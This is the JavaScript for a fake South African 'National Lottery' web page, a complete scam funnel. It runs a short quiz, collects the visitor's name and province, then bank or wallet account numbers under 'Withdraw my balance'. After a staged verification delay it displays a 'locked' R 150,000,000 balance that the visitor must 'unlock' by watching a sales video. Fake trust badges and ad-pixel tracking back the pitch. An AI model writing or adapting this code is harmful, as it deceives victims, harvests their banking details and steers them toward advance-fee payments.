/**
 * National Lottery Quiz & VSL - Application Logic
 * Implements step-based rendering, validation, and payment details
 */

// Global state variables
let currentQuizStep = 0;

// Logo templates (utilizes local logo.jpeg with external fallback)
const LOGO_TEMPLATE = `
  <div class="logo-wrap">
    <div class="logo-main-box">
      <img src="logo.jpeg" onerror="this.onerror=null; this.src='https://i.imgur.com/Fjfcavb.jpeg';" alt="National Lottery Logo"/>
    </div>
    <div class="verified">
      <i class="ti ti-shield-check" style="font-size:15px"></i> Verified &amp; secure platform
    </div>
  </div>
`;

// Quiz Questions
const QUIZ_QUESTIONS = [
  {
    step: "Question 1 of 3",
    q: "What would you do with the prize?",
    opts: [
      "Invest in a business",
      "Help my family",
      "Buy property or a vehicle",
      "Save for the future"
    ]
  },
  {
    step: "Question 2 of 3",
    q: "How often do you participate in draws?",
    opts: [
      "First time",
      "Sometimes",
      "Regularly",
      "Every chance I get"
    ]
  },
  {
    step: "Question 3 of 3",
    q: "How did you hear about the National Lottery?",
    opts: [
      "Social media",
      "Friends or family",
      "Television",
      "Other"
    ]
  }
];

// South African provinces
const PROVINCES = [
  "Eastern Cape",
  "Free State",
  "Gauteng",
  "KwaZulu-Natal",
  "Limpopo",
  "Mpumalanga",
  "North West",
  "Northern Cape",
  "Western Cape"
];

// Payment providers listing with branding colors
const PAYMENT_PROVIDERS = [
  { id: "fnb", name: "FNB eWallet", bg: "#005baa" },
  { id: "capitec", name: "Capitec Pay", bg: "#003087" },
  { id: "mpesa", name: "M-Pesa", bg: "#e11d48" },
  { id: "ozow", name: "Ozow", bg: "#7c3aed" },
  { id: "peach", name: "Peach Payments", bg: "#f97316" },
  { id: "snapscan", name: "SnapScan", bg: "#00b894" }
];

/**
 * Builds the HTML structure for the progress bar dots
 */
function getProgressBarHtml(step) {
  let progressHtml = '<div class="progress">';
  for (let i = 0; i < 3; i++) {
    const activeClass = i < step ? ' done' : i === step ? ' active' : '';
    progressHtml += `<div class="bar${activeClass}"></div>`;
  }
  progressHtml += '</div>';
  return progressHtml;
}

/**
 * STEP 1: Renders the active Quiz question
 */
function showQuiz() {
  const currentQ = QUIZ_QUESTIONS[currentQuizStep];
  
  const optionsHtml = currentQ.opts.map((option, idx) => `
    <div class="opt" data-idx="${idx}">
      <div class="circle">
        <div class="odot"></div>
      </div>
      ${option}
    </div>
  `).join('');

  document.getElementById('screen').innerHTML = `
    <div class="body">
      ${LOGO_TEMPLATE}
      <div class="card">
        <div class="id-row">
          <span class="id-lbl">Entry ID:</span>
          <span class="id-val">77773</span>
        </div>
        ${getProgressBarHtml(currentQuizStep)}
        <div class="step-lbl">${currentQ.step}</div>
        <h2 class="question">${currentQ.q}</h2>
        <div class="sub">Select an option to continue</div>
        <div class="opts">
          ${optionsHtml}
        </div>
      </div>
    </div>
  `;

  // Bind option selection
  document.querySelectorAll('.opt').forEach(optElement => {
    optElement.addEventListener('click', () => {
      document.querySelectorAll('.opt').forEach(el => el.classList.remove('sel'));
      optElement.classList.add('sel');
      
      // Delay before proceeding for native responsive micro-animation
      setTimeout(() => {
        currentQuizStep++;
        if (currentQuizStep < QUIZ_QUESTIONS.length) {
          showQuiz();
        } else {
          showForm();
        }
      }, 380);
    });
  });
}

/**
 * STEP 2: Renders customer details form (Name & Province)
 */
function showForm() {
  const provinceOptionsHtml = PROVINCES.map(prov => `<option>${prov}</option>`).join('');

  document.getElementById('screen').innerHTML = `
    <div class="body">
      ${LOGO_TEMPLATE}
      <div class="card">
        <div class="section-title">
          <i class="ti ti-user" style="font-size:18px;color:var(--accent-gold)"></i> Fill in your details
        </div>
        <div class="section-sub">Enter your information below to continue</div>
        
        <div class="field-group">
          <div class="field-lbl">
            <i class="ti ti-user" style="font-size:15px"></i> Full name
          </div>
          <input class="field-input" id="fname" placeholder="Enter your full name" type="text" autocomplete="name"/>
        </div>
        
        <div class="field-group">
          <div class="field-lbl">
            <i class="ti ti-map-pin" style="font-size:15px"></i> Province
          </div>
          <select class="field-input" id="fprov" style="cursor:pointer">
            <option value="" disabled selected>Select your province</option>
            ${provinceOptionsHtml}
          </select>
        </div>
        
        <button class="btn-main" id="fcont">Continue</button>
      </div>
    </div>
  `;

  document.getElementById('fcont').addEventListener('click', () => {
    const nameInput = document.getElementById('fname');
    const provinceSelect = document.getElementById('fprov');
    const nameValue = nameInput.value.trim();
    const provinceValue = provinceSelect.value;
    
    let hasError = false;

    if (!nameValue) {
      nameInput.style.borderColor = '#e63946';
      hasError = true;
    } else {
      nameInput.style.borderColor = '';
    }

    if (!provinceValue) {
      provinceSelect.style.borderColor = '#e63946';
      hasError = true;
    } else {
      provinceSelect.style.borderColor = '';
    }

    if (hasError) return;

    // Track Meta Pixel Lead event
    if (typeof fbTrack === 'function') {
      fbTrack('Lead');
    }
    
    showPayMethod();
  });
}

/**
 * STEP 3: Renders payment method selection and custom fields
 */
function showPayMethod() {
  const payGridHtml = PAYMENT_PROVIDERS.map(pay => `
    <div class="pay-opt" data-provider-id="${pay.id}">
      <div class="pay-icon" style="background:${pay.bg}">
        ${pay.name.substring(0, 8)}
      </div>
      <div class="pay-name">${pay.name}</div>
    </div>
  `).join('');

  document.getElementById('screen').innerHTML = `
    <div class="body">
      ${LOGO_TEMPLATE}
      <div class="card">
        <div class="section-title">
          <i class="ti ti-wallet" style="font-size:18px;color:var(--accent-gold)"></i> Payment method
        </div>
        <div class="section-sub">Choose how you want to receive your balance</div>
        
        <div class="pay-grid" id="paygrid">
          ${payGridHtml}
        </div>
        
        <div id="payfields" style="display:none">
          <div class="field-group">
            <div class="field-lbl">
              <i class="ti ti-credit-card" style="font-size:15px"></i> Account number
            </div>
            <input class="field-input" id="acc_number" placeholder="Enter your account number" type="text" autocomplete="off"/>
          </div>
          
          <div class="field-group">
            <div class="field-lbl">
              <i class="ti ti-user" style="font-size:15px"></i> Account holder name
            </div>
            <input class="field-input" id="acc_name" placeholder="Enter account holder name" type="text" autocomplete="off"/>
          </div>
          
          <button class="btn-main" id="withdraw">Withdraw my balance</button>
        </div>
      </div>
    </div>
  `;

  // Bind payment grid click events
  document.querySelectorAll('.pay-opt').forEach(optElement => {
    optElement.addEventListener('click', () => {
      // Clear previous checks
      document.querySelectorAll('.pay-opt').forEach(el => {
        el.classList.remove('sel');
        const check = el.querySelector('.pay-check');
        if (check) check.remove();
      });

      // Mark selected
      optElement.classList.add('sel');
      
      const checkBadge = document.createElement('div');
      checkBadge.className = 'pay-check';
      checkBadge.innerHTML = '<i class="ti ti-circle-check"></i>';
      optElement.appendChild(checkBadge);

      // Reveal input fields
      document.getElementById('payfields').style.display = 'block';
    });
  });

  // Bind withdrawal form submission
  document.getElementById('withdraw').addEventListener('click', () => {
    const accNum = document.getElementById('acc_number');
    const accName = document.getElementById('acc_name');
    
    let hasError = false;
    
    if (!accNum.value.trim()) {
      accNum.style.borderColor = '#e63946';
      hasError = true;
    } else {
      accNum.style.borderColor = '';
    }

    if (!accName.value.trim()) {
      accName.style.borderColor = '#e63946';
      hasError = true;
    } else {
      accName.style.borderColor = '';
    }

    if (hasError) return;

    showLoading();
  });
}

/**
 * STEP 4: Processing / Loading simulation
 */
function showLoading() {
  document.getElementById('screen').innerHTML = `
    <div class="loading-wrap">
      <div class="logo-main-box" style="width: 80px; height: 80px;">
        <img src="logo.jpeg" onerror="this.onerror=null; this.src='https://i.imgur.com/Fjfcavb.jpeg';" alt="logo" style="width:100%;height:100%;object-fit:cover"/>
      </div>
      <div class="spinner"></div>
      <div>
        <h2 class="loading-title">Processing your request...</h2>
        <div class="loading-sub">Verifying payment details</div>
        <div class="dots">
          <div class="dot2"></div>
          <div class="dot2"></div>
          <div class="dot2"></div>
        </div>
      </div>
    </div>
  `;

  // Simulates verification delay before final checkout step
  setTimeout(showLocked, 3000);
}

/**
 * STEP 5: Final VSL Balance Locked screen with convergent player
 */
function showLocked() {
  // Track Meta Pixel Checkout Initialized event
  if (typeof fbTrack === 'function') {
    fbTrack('InitiateCheckout');
  }

  document.getElementById('screen').innerHTML = `
    <div class="body" style="padding-top:24px">
      <div class="card" style="max-width:550px">
        
        <div class="locked-hdr">
          <i class="ti ti-lock" style="font-size:20px;color:#fca07a"></i>
          <div class="locked-title">Balance Locked — Activation Required</div>
        </div>
        
        <div class="locked-bal-box">
          <div class="locked-bal-lbl">Available balance</div>
          <div class="locked-bal-amt">R 150,000,000 <span class="blocked-badge">LOCKED</span></div>
        </div>
        
        <div style="color:var(--accent-gold);font-size:13px;font-weight:600;margin-bottom:12px;display:flex;align-items:center;gap:8px">
          <i class="ti ti-player-play" style="font-size:14px"></i> Watch the video to unlock your balance
        </div>
        
        <!-- Vturb smartplayer wrapper -->
        <div class="video-container">
          <vturb-smartplayer id="vid-6a19c07ea2a340c8293759ed" style="display: block; margin: 0 auto; width: 100%;"></vturb-smartplayer>
        </div>
        
        <div class="perks-row">
          <div class="perk">
            <div class="perk-icon"><i class="ti ti-shield-check"></i></div>
            <div class="perk-name">Security</div>
          </div>
          <div class="perk">
            <div class="perk-icon"><i class="ti ti-bolt"></i></div>
            <div class="perk-name">Speed</div>
          </div>
          <div class="perk">
            <div class="perk-icon"><i class="ti ti-users"></i></div>
            <div class="perk-name">+2,500 users</div>
          </div>
        </div>
        
        <div style="color:var(--text-muted);font-size:12px;text-align:center;margin-top:16px;display:flex;align-items:center;justify-content:center;gap:6px">
          <i class="ti ti-lock" style="font-size:13px"></i> Watch the video to unlock
        </div>
      </div>
    </div>
  `;
}

// Automatically start the quiz flow upon load
document.addEventListener("DOMContentLoaded", () => {
  showQuiz();
});
